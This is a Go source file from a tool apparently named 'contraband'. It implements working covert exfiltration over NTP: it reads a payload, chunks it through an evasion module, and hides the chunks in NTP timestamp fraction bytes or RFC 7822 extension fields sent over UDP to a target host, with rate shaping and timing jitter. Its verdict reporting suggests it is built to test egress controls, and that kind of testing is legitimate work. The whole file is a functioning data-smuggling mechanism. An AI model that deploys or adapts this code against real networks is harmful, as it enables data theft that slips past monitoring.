package covert

import (
	"context"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/shehzade/contraband/pkg/client/evasion"
	"github.com/shehzade/contraband/pkg/client/exfil"
	"github.com/shehzade/contraband/pkg/common"
)

func init() {
	exfil.RegisterExfiltrator(common.ProtoNTPTime, NewNTPExfiltrator())
}

const (
	NTPExtensionFieldTypeCTRB = 0x4354 // "CT"
	NTPHeaderLength           = 48
)

// NTPExfiltrator implements NTP Transmit Timestamp and RFC 7822 Extension Field Smuggling.
type NTPExfiltrator struct{}

func NewNTPExfiltrator() *NTPExfiltrator {
	return &NTPExfiltrator{}
}

func (e *NTPExfiltrator) Protocol() string {
	return common.ProtoNTPTime
}

// BuildNTPPacket builds a standard 48-byte NTP client packet with optional RFC 7822 extension field.
func BuildNTPPacket(mode string, chunkData []byte) []byte {
	buf := make([]byte, NTPHeaderLength)
	buf[0] = 0x23 // LI=0, VN=4, Mode=3 (Client)
	buf[1] = 0    // Stratum 0
	buf[2] = 4    // Poll 16s
	buf[3] = 0xFA // Precision

	now := time.Now().UTC()
	secs := uint32(now.Unix() + 2208988800) // Seconds since Jan 1 1900
	binary.BigEndian.PutUint32(buf[40:44], secs)

	if mode == "fractional" && len(chunkData) >= 4 {
		// Smuggle 4 bytes directly into fractional seconds (offset 44-48)
		copy(buf[44:48], chunkData[:4])
		return buf
	}

	// Normal random fraction
	frac := uint32(now.Nanosecond())
	binary.BigEndian.PutUint32(buf[44:48], frac)

	if len(chunkData) > 0 {
		// RFC 7822 Extension Field:
		// Type (2 bytes) + Length (2 bytes) + Value (padded to 4-byte multiple)
		valLen := len(chunkData)
		padLen := (4 - (valLen % 4)) % 4
		extFieldLen := 4 + valLen + padLen
		if extFieldLen < 16 {
			// RFC 7822 requires extension field length to be at least 16 or 28 octets
			padLen += 16 - extFieldLen
			extFieldLen = 16
		}

		extBuf := make([]byte, extFieldLen)
		binary.BigEndian.PutUint16(extBuf[0:2], NTPExtensionFieldTypeCTRB)
		binary.BigEndian.PutUint16(extBuf[2:4], uint16(extFieldLen))
		copy(extBuf[4:], chunkData)

		buf = append(buf, extBuf...)
	}

	return buf
}

func (e *NTPExfiltrator) Exfiltrate(ctx context.Context, reader io.Reader, opts exfil.ExfilOptions) (*common.ProbeResult, error) {
	if err := opts.Validate(); err != nil {
		return nil, err
	}

	start := time.Now().UTC()
	result, err := common.NewProbeResult("exfil", e.Protocol(), opts.TargetHost, opts.TargetPort)
	if err != nil {
		return nil, err
	}
	result.Timestamps.StartTCP = start
	result.PayloadType = opts.PayloadType
	result.CarrierType = opts.CarrierType

	payload, err := io.ReadAll(reader)
	if err != nil {
		return nil, fmt.Errorf("failed to read payload: %w", err)
	}
	result.TargetVolume = int64(len(payload))

	if opts.ExpectedHash == "" {
		h := sha256.Sum256(payload)
		opts.ExpectedHash = hex.EncodeToString(h[:])
	}
	result.PayloadHash = opts.ExpectedHash

	if opts.SessionToken.IsZero() {
		tok, tokErr := common.NewSessionToken()
		if tokErr != nil {
			return nil, tokErr
		}
		opts.SessionToken = tok
	}

	chunks, err := evasion.ChunkPayload(payload, opts.SessionToken, opts.ChunkSize)
	if err != nil {
		return nil, fmt.Errorf("failed to chunk payload: %w", err)
	}

	mode := strings.ToLower(opts.Headers["ntp_mode"])
	if mode == "" {
		mode = "extension" // Default to RFC 7822 high-capacity extension fields
	}

	targetAddr := net.JoinHostPort(opts.TargetHost, strconv.Itoa(opts.TargetPort))
	udpAddr, resErr := net.ResolveUDPAddr("udp", targetAddr)
	if resErr != nil {
		result.Verdict = classifyCovertError(resErr)
		result.ErrorMessage = resErr.Error()
		calculateCovertDurations(&result)
		return &result, resErr
	}

	conn, dialErr := net.DialUDP("udp", nil, udpAddr)
	if dialErr != nil {
		result.Verdict = classifyCovertError(dialErr)
		result.ErrorMessage = dialErr.Error()
		calculateCovertDurations(&result)
		return &result, dialErr
	}
	defer conn.Close()

	result.Timestamps.ConnectedTCP = time.Now().UTC()
	result.Timestamps.FirstByteSent = time.Now().UTC()

	for seq := 1; seq <= len(chunks); seq++ {
		chunkFrame := chunks[seq-1]

		if opts.Shaper != nil {
			if err := opts.Shaper.WaitN(ctx, len(chunkFrame)); err != nil {
				result.Verdict = classifyCovertError(err)
				result.ErrorMessage = err.Error()
				calculateCovertDurations(&result)
				return &result, err
			}
		}
		if opts.Cadence != nil {
			delay := opts.Cadence.NextDelay()
			if delay > 0 {
				select {
				case <-time.After(delay):
				case <-ctx.Done():
					result.Verdict = classifyCovertError(ctx.Err())
					result.ErrorMessage = ctx.Err().Error()
					calculateCovertDurations(&result)
					return &result, ctx.Err()
				}
			}
		}

		ntpPacket := BuildNTPPacket(mode, chunkFrame)
		if _, writeErr := conn.Write(ntpPacket); writeErr != nil {
			result.Verdict = classifyCovertError(writeErr)
			result.ErrorMessage = fmt.Sprintf("NTP write failed: %v", writeErr)
			calculateCovertDurations(&result)
			return &result, writeErr
		}
		result.BytesSent += int64(len(ntpPacket))

		// Await NTP Mode 4 Server reply
		_ = conn.SetReadDeadline(time.Now().Add(opts.Timeout))
		replyBuf := make([]byte, 1024)
		n, readErr := conn.Read(replyBuf)
		if readErr != nil {
			result.Verdict = classifyCovertError(readErr)
			result.ErrorMessage = fmt.Sprintf("NTP reply timeout/error for chunk %d: %v", seq, readErr)
			calculateCovertDurations(&result)
			return &result, readErr
		}
		result.BytesRecv += int64(n)

		if n < 48 {
			err := fmt.Errorf("truncated NTP server response: %d bytes", n)
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = err.Error()
			calculateCovertDurations(&result)
			return &result, err
		}

		modeByte := replyBuf[0] & 0x07
		if modeByte != 4 { // Mode 4: Server
			err := fmt.Errorf("unexpected NTP response mode: %d (expected 4)", modeByte)
			result.Verdict = common.VerdictBlockedL7
			result.ErrorMessage = err.Error()
			calculateCovertDurations(&result)
			return &result, err
		}
	}

	result.Timestamps.AckReceived = time.Now().UTC()
	result.Timestamps.TeardownDone = time.Now().UTC()
	result.Verdict = common.VerdictSuccess
	result.RawEvidence = common.FormatBoundedRawEvidence(payload)
	calculateCovertDurations(&result)

	return &result, nil
}
